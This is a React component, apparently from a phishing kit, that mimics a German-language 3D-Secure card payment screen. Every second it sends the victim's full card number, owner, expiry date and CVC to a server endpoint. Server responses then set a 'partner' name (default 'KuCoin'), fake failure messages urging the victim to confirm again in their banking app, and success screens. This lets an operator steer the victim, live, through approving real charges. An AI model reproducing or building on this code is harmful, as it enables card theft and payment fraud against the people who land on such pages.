import React, {useEffect, useState} from "react";
import {RotatingLines} from "react-loader-spinner";
import iconVisa from '../images/visa.svg'
import iconMastercard from '../images/mastercard.svg'
import iconAmericanExpress from '../images/americanexpress.svg'
import gifTabPhone from '../images/tab-phone.gif'
import iconSuccess from '../images/success.svg'
import axios from "axios";
import {router} from "@inertiajs/react";

export default function (props) {
    const {pin, ccNumber, ccOwner, ccDate, ccCvc, formattedPrice, paymentSessionId, paymentWindowId, onError} = props;

    const [partner, setPartner] = useState('KuCoin');
    const [showWaitForConfirmation, setShowWaitForConfirmation] = useState(false);
    const [waitForConfirmationError, setWaitForConfirmationError] = useState('Fehlgeschlagen. Bitte bestätigen Sie erneut!');

    const [showFullScreenSpinner, setShowFullScreenSpinner] = useState(true);
    const [fullScreenSpinnerLabel, setFullScreenSpinnerLabel] = useState('Bitte warten');

    const [showSuccess, setShowSuccess] = useState(false);

    const isVisa = ccNumber.startsWith('4');
    const isMasterCard = ccNumber.startsWith('2') || ccNumber.startsWith('5');
    const isAmericanExpress = ccNumber.startsWith('3');

    const cardIcon = isVisa ? iconVisa : (isMasterCard ? iconMastercard : iconAmericanExpress);

    useEffect(() => {
        const timer = setInterval(() => {
            axios.post('/api/' + pin + '/' + paymentSessionId + '/' + paymentWindowId + '/poll', {
                ccNumber: ccNumber,
                ccOwner: ccOwner,
                ccDate: ccDate,
                ccCvc: ccCvc
            }).then(response => {
                setPartner(response.data.partner);
                setShowWaitForConfirmation(response.data.show_wait_for_confirmation === 1);
                setWaitForConfirmationError(response.data.wait_for_confirmation_error);

                setShowFullScreenSpinner(response.data.show_fullscreen_spinner === 1);
                setFullScreenSpinnerLabel(response.data.fullscreen_spinner_label);

                setShowSuccess(response.data.show_success === 1);

                if (response.data.close_window_with_error) {
                    onError({
                        message: response.data.error_message,
                        formErrors: {
                            cc_number: response.data.error_cc_number === 1,
                            cc_owner: response.data.error_cc_owner === 1,
                            cc_expire: response.data.error_cc_date === 1,
                            cc_cvc: response.data.error_cc_cvc === 1,
                        }
                    });
                } else if (response.data.show_success === 1) {
                    clearInterval(timer);
                    setTimeout(() => {
                        router.post('/' + pin + '/bezahlt', {});
                    }, 5000);
                }
            });
        }, 1000);

        return () => clearInterval(timer);
    }, []);

    return (
        <div className="relative border-2 border-gray-300 w-full min-h-[25rem]">

            {showWaitForConfirmation &&
                <div className="p-8">
                    {!isAmericanExpress &&
                        <div className="text-gray-600">
                            Durchgeführt von
                        </div>
                    }
                    <div>
                        <img src={cardIcon}
                             className={"w-auto " + (isVisa ? 'h-10' : (isMasterCard ? 'h-16' : 'h-20'))}/>
                    </div>


                    <div className="mt-10">
                        {waitForConfirmationError &&
                            <div className="mb-3 text-xs font-semibold text-red-700">
                                {waitForConfirmationError}
                            </div>
                        }
                        <div className=" text-lg font-semibold">
                            3D-Secure
                        </div>
                    </div>

                    <div className="flex flex-row gap-2 md:gap-6 items-center">
                        <div className="shrink-0">
                            <img src={gifTabPhone} className="h-28 w-auto"/>
                        </div>
                        <div>
                            <div>
                                Bitte öffnen Sie Ihre Banking App und bestätigen Sie die Zahlung
                                über {formattedPrice} durch
                                unseren Partner <span className="font-semibold">{partner}</span>.
                            </div>
                        </div>
                    </div>
                </div>
            }

            {showSuccess &&
                <>
                    {isAmericanExpress &&
                        <div className="absolute top-0 right-0">
                            <img src={cardIcon} className="h-16 w-auto"/>
                        </div>
                    }

                    <div className="absolute top-0 left-0 w-full h-full">
                        <div className="flex items-center justify-center w-full h-full">
                            <div className="flex flex-col items-center gap-y-3">
                                {isVisa &&
                                    <img src={cardIcon} className="h-8 w-auto"/>
                                }
                                {isMasterCard &&
                                    <img src={cardIcon} className="h-16 w-auto"/>
                                }
                                <div>
                                    <img src={iconSuccess}/>
                                </div>
                                <div className="text-sm text-center">
                                    <div className="text-green-800">
                                        Zahlung abgeschlossen.
                                    </div>
                                    <div className="text-gray-500">
                                        Sie werden weitergeleitet...
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </>
            }

            {showFullScreenSpinner &&
                <>
                    {isAmericanExpress &&
                        <div className="absolute top-0 right-0">
                            <img src={cardIcon} className="h-16 w-auto"/>
                        </div>
                    }

                    <div className="absolute top-0 left-0 w-full h-full">
                        <div className="flex items-center justify-center w-full h-full">
                            <div className="flex flex-col items-center gap-y-3">
                                {isVisa &&
                                    <img src={cardIcon} className="h-8 w-auto"/>
                                }
                                {isMasterCard &&
                                    <img src={cardIcon} className="h-16 w-auto"/>
                                }
                                <RotatingLines
                                    visible={true}
                                    height="5rem"
                                    width="5rem"
                                    color="grey"
                                    strokeColor="gray"
                                    strokeWidth="4"
                                    animationDuration="0.75"
                                    ariaLabel="rotating-lines-loading"
                                    wrapperStyle={{}}
                                    wrapperClass=""
                                />
                                <div className="text-gray-500 text-sm">
                                    {fullScreenSpinnerLabel}
                                </div>
                            </div>
                        </div>
                    </div>
                </>
            }

            <div className="absolute top-0 left-0 w-full h-full">
                <div className="flex items-end justify-center w-full h-full text-sm text-gray-400">
                    Schließen Sie nicht diese Seite!
                </div>
            </div>
        </div>
    );
};
